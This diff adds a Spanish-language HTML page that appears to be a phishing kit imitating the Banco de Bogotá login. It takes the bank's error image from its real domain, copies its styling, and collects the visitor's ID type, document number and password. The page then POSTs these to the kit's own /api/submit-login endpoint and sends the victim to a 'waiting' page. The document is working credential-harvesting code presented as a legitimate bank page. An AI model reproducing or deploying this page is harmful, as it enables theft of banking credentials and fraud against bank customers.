@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario de Ingreso</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+              font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+              background-color: #f5f5f5;
+              background-image: url('img/fondo.jpg');
+              background-size: cover;
+              background-position: center center;
+              background-repeat: no-repeat;
+              background-attachment: scroll;
+              min-height: 100vh;
+              width: 100%;
+        }
+
+        .modal_select_documento.flex, .content_modal_e.flex {
+            display: flex;
+        }
+
+        .custom-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .custom-modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(-30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(100%); }
+            to { transform: translateY(0); }
+        }
+
+        .spinner-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #df0209;
+            width: 50px;
+            height: 50px;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .modal_select_documento {
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(4px);
+        }
+        
+        .modal_select_documento .bg-white {
+            max-height: 70vh;
+            overflow-y: auto;
+            border-radius: 16px 16px 0 0;
+            animation: slideUp 0.3s ease;
+        }
+
+        header {
+            background: #ffffff;
+            padding: 2rem 1rem 1.5rem;
+            text-align: center;
+        }
+
+        header img {
+            max-width: 180px;
+            height: auto;
+        }
+
+        .main-container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 2rem 1.5rem;
+            background: white;
+            border-radius: 12px 12px 0 0;
+            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.05);
+        }
+
+        .greeting {
+            font-size: 1.5rem;
+            font-weight: 400;
+            color: #333;
+            margin-bottom: 0.25rem;
+        }
+
+        .welcome-text {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 2rem;
+        }
+
+        label {
+            font-size: 0.875rem;
+            font-weight: 500;
+            color: #333;
+        }
+
+        input[type="tel"], 
+        input[type="password"] {
+            transition: all 0.2s ease;
+            border: 1.5px solid #d1d5db;
+            font-size: 1rem;
+            color: #333;
+        }
+
+        input[type="tel"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #df0209;
+            box-shadow: 0 0 0 3px rgba(223, 2, 9, 0.1);
+        }
+
+        input::placeholder {
+            color: #9ca3af;
+        }
+
+        #tipo_doc_select {
+            transition: all 0.2s ease;
+            border: 1.5px solid #d1d5db;
+            background: white;
+        }
+
+        #tipo_doc_select:hover {
+            border-color: #a0a0a0;
+        }
+
+        #tipo_doc_select:active {
+            transform: scale(0.98);
+        }
+
+        input[type="checkbox"] {
+            appearance: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #d1d5db;
+            border-radius: 4px;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.2s ease;
+        }
+
+        input[type="checkbox"]:checked {
+            background: #df0209;
+            border-color: #df0209;
+        }
+
+        input[type="checkbox"]:checked::after {
+            content: '✓';
+            position: absolute;
+            color: white;
+            font-size: 14px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        #ingresarBtn {
+            transition: all 0.3s ease;
+            font-weight: 600;
+            text-transform: none;
+            letter-spacing: 0;
+            border-radius: 30px;
+            box-shadow: none;
+        }
+
+        #ingresarBtn:hover:not(:disabled) {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(223, 2, 9, 0.2);
+        }
+
+        #ingresarBtn:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        #ingresarBtn:disabled {
+            background-color: #e5e7eb;
+            color: #9ca3af;
+            cursor: not-allowed;
+        }
+
+        .opciones > div {
+            transition: background-color 0.2s ease;
+        }
+
+        .opciones > div:hover {
+            background-color: #f9fafb;
+        }
+
+        @media (max-width: 640px) {
+            body {
+                background-size: cover;
+                background-position: center center;
+                background-repeat: no-repeat;
+                min-height: 100vh;
+            }
+            .main-container {
+                border-radius: 16px 16px 0 0;
+                margin-top: -1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="app"></div>
+
+    <div id="error-modal" class="custom-modal">
+        <div class="custom-modal-content">
+            <div class="flex items-center justify-center gap-5 flex-col md:flex-row">
+                <img src="https://virtual.bancodebogota.co/bbog-pb-frontend-authentication-app/assets/422e00391dd36d89affe.png" alt="Icono de error" class="w-15 h-15">
+                <div>
+                    <h3 class="mb-5 text-[#df0209]">¡Ups! Algo salió mal</h3>
+                    <p>Los datos ingresados no coinciden con los de tu cuenta. Por favor, verifica tu información y vuelve a intentarlo.</p>
+                </div>
+            </div>
+            <button id="back-to-start-button" class="mt-5 w-full bg-[#df0209] text-white py-3 rounded-lg">Volver al inicio</button>
+        </div>
+    </div>
+
+    <div id="spinner-modal" class="spinner-container">
+        <div class="spinner"></div>
+    </div>
+
+    <script>
+document.addEventListener('DOMContentLoaded', () => {
+    const app = document.querySelector('#app');
+    if (app) {
+        app.innerHTML = homeTemplate();
+    }
+
+    const form = document.querySelector('#miFormulario');
+    const nroDoc = document.getElementById("nro_doc");
+    const clave = document.getElementById("clave");
+    const ingresarBtn = document.getElementById("ingresarBtn");
+    const tipoDocSelect = document.getElementById("tipo_doc_select");
+    const modalSelect = document.querySelector(".modal_select_documento");
+    const opciones = document.querySelectorAll(".opciones > div");
+    const textTipoDoc = document.getElementById("text_tipo_doc");
+    const inputTipoDoc = document.querySelector("input[name='tipo_doc']");
+    const errorModal = document.getElementById('error-modal');
+    const backToStartButton = document.getElementById('back-to-start-button');
+    const spinnerModal = document.getElementById('spinner-modal');
+    
+    const transactionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
+    
+    const API_URL = window.location.hostname === 'localhost' 
+        ? 'http://localhost:3000' 
+        : window.location.origin;
+
+    if (tipoDocSelect) {
+        tipoDocSelect.addEventListener("click", () => {
+            if (modalSelect) {
+                modalSelect.classList.remove("hidden");
+                modalSelect.classList.add("flex");
+            }
+        });
+    }
+
+    opciones.forEach(opcion => {
+        opcion.addEventListener("click", () => {
+            const nombreCompleto = opcion.dataset.value;
+            let abreviacion;
+            const parts = opcion.textContent.split(" - ");
+            if (parts.length > 1) {
+                abreviacion = parts[0];
+            } else {
+                abreviacion = opcion.dataset.id.toUpperCase();
+            }
+            if (textTipoDoc) textTipoDoc.textContent = abreviacion;
+            if (inputTipoDoc) inputTipoDoc.value = nombreCompleto;
+            closeModalTipoDoc();
+            validateForm();
+        });
+    });
+
+    window.closeModalTipoDoc = () => {
+        if (modalSelect) {
+            modalSelect.classList.add("hidden");
+            modalSelect.classList.remove("flex");
+        }
+    };
+
+    function validateForm() {
+        const nroDocValid = nroDoc && nroDoc.value.length >= 6 && nroDoc.value.length <= 10;
+        const claveValid = clave && clave.value.length >= 6 && clave.value.length <= 8;
+        const isFormValid = nroDocValid && claveValid;
+        if (ingresarBtn) {
+            ingresarBtn.disabled = !isFormValid;
+        }
+    }
+
+    [nroDoc, clave].forEach(input => {
+        if (input) {
+            input.addEventListener("input", validateForm);
+            input.addEventListener("input", () => {
+                if (input.value.length > input.maxLength) {
+                    input.value = input.value.slice(0, input.maxLength);
+                }
+            });
+        }
+    });
+
+    async function fetchWithTimeout(url, options = {}, timeout = 5000) {
+        const controller = new AbortController();
+        const id = setTimeout(() => controller.abort(), timeout);
+        
+        try {
+            const response = await fetch(url, {
+                ...options,
+                signal: controller.signal
+            });
+            clearTimeout(id);
+            return response;
+        } catch (error) {
+            clearTimeout(id);
+            if (error.name === 'AbortError') {
+                throw new Error('Request timeout');
+            }
+            throw error;
+        }
+    }
+
+    async function enviarDatosLogin(loginData) {
+        try {
+            const response = await fetchWithTimeout(`${API_URL}/api/submit-login`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    transaction_id: transactionId,
+                    tipo_doc: loginData.tipoDoc,
+                    nro_doc: loginData.nroDoc,
+                    clave: loginData.clave
+                })
+            });
+            
+            if (!response.ok) {
+                throw new Error(`HTTP Error ${response.status}`);
+            }
+            
+            const result = await response.json();
+            
+            if (!result || typeof result.success !== 'boolean') {
+                throw new Error('Respuesta inválida del servidor');
+            }
+            
+            return result.success;
+        } catch (error) {
+            console.error('Error al enviar datos:', error);
+            return false;
+        }
+    }
+
+    form.addEventListener("submit", async (event) => {
+        event.preventDefault();
+        
+        const loginData = {
+            tipoDoc: inputTipoDoc.value,
+            nroDoc: nroDoc.value,
+            clave: clave.value
+        };
+        
+        spinnerModal.style.display = 'flex';
+        ingresarBtn.disabled = true;
+        
+        const success = await enviarDatosLogin(loginData);
+        
+        if (success) {
+            sessionStorage.setItem('initialLoginData', JSON.stringify({
+                ...loginData,
+                transactionId: transactionId
+            }));
+            sessionStorage.setItem('transactionId', transactionId);
+            
+            // REDIRIGIR A PÁGINA DE ESPERA
+            window.location.href = 'espera.html';
+        } else {
+            spinnerModal.style.display = 'none';
+            ingresarBtn.disabled = false;
+            errorModal.style.display = 'flex';
+        }
+    });
+
+    if (backToStartButton) {
+        backToStartButton.addEventListener('click', () => {
+            errorModal.style.display = 'none';
+            window.location.href = "index2.html";
+        });
+    }
+});
+
+function homeTemplate() {
+    return `
+        <header>
+            <img src="img/logo2.png" alt="" class="mx-auto">
+        </header>
+
+        <div class="main-container">
+            <h1 class="greeting">¡Hola!</h1>
+            <h2 class="welcome-text">Nos alegra que esté aquí</h2>
+
+            <form id="miFormulario">
+                <div class="w-full mb-6">
+                    <div class="w-full flex items-center justify-between mb-3">
+                        <div class="flex flex-row items-center gap-2">
+                            <img src="img/user.svg" alt="" class="w-[17px] h-[17px]">
+                            <label class="text-sm m-0">Identificación</label>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label class="text-sm m-0">Recordar</label>
+                            <input type="checkbox" name="" id="">
+                        </div>
+                    </div>
+                    <div class="w-full flex flex-row items-center justify-between gap-3">
+                        <div id="tipo_doc_select" class="flex flex-row items-center w-[22%] border bg-white rounded-lg box-border p-3 justify-between cursor-pointer">
+                            <p id="text_tipo_doc" class="text-base font-medium">C.C</p>
+                            <img src="img/arror_down.svg" alt="" class="w-[12px] h-[12px]">
+                            <input type="hidden" name="tipo_doc" value="Cédula de Ciudadanía">
+                        </div>
+                        <input type="tel" name="nro_doc" id="nro_doc" placeholder="Número de documento" minlength="6" maxlength="10" class="w-[75%] text-base border bg-white rounded-lg box-border p-3">
+                    </div>
+                </div>
+
+                <div class="w-full mb-6" id="clave_segura_section">
+                    <div class="w-full flex items-center mb-3">
+                        <div class="flex flex-row items-center gap-2">
+                            <img src="img/lock.svg" alt="" class="w-[17px] h-[17px]">
+                            <label class="text-sm">Clave</label>
+                        </div>
+                    </div>
+                    <div>
+                        <input type="password" name="clave" id="clave" placeholder="••••••" minlength="6" maxlength="8" class="w-full text-base border bg-white rounded-lg box-border p-3 text-center tracking-widest font-mono">
+                    </div>
+                </div>
+
+                <button type="submit" id="ingresarBtn" disabled class="block w-full text-white bg-[#df0209] text-base border-none py-3 px-0 text-center mt-6">Continuar</button>
+            </form>
+        </div>
+
+        <div class="modal_select_documento w-full h-screen min-h-screen fixed top-0 left-0 z-[999] bg-black bg-opacity-50 flex-col justify-end hidden">
+            <div class="bg-white w-full h-max-content box-border">
+                <div class="w-full flex justify-end box-border py-3 px-4 border-b border-gray-200">
+                    <img src="img/times.svg" alt="" onclick="closeModalTipoDoc()" class="w-[32px] h-[32px] cursor-pointer">
+                </div>
+                <div class="opciones">
+                    <div class="cursor-pointer flex items-center justify-center box-border py-3 border-b border-gray-100" data-value="Cédula de Ciudadanía" data-id="cc"><p class="text-center text-base font-normal text-gray-700">C.C - Cédula de Ciudadanía</p></div>
+                    <div class="cursor-pointer flex items-center justify-center box-border py-3 border-b border-gray-100" data-value="Cédula de Extranjería" data-id="ce"><p class="text-center text-base font-normal text-gray-700">C.E - Cédula de Extranjería</p></div>
+                    <div class="cursor-pointer flex items-center justify-center box-border py-3 border-b border-gray-100" data-value="NIT" data-id="nit"><p class="text-center text-base font-normal text-gray-700">NIT</p></div>
+                    <div class="cursor-pointer flex items-center justify-center box-border py-3 border-b border-gray-100" data-value="Tarjeta de Identidad" data-id="ti"><p class="text-center text-base font-normal text-gray-700">T.I - Tarjeta de Identidad</p></div>
+                    <div class="cursor-pointer flex items-center justify-center box-border py-3 border-b border-gray-100" data-value="Pasaporte" data-id="ps"><p class="text-center text-base font-normal text-gray-700">PS. - Pasaporte</p></div>
+                </div>
+            </div>
+        </div>
+    `;
+}
+    </script>
+</body>
+</html>
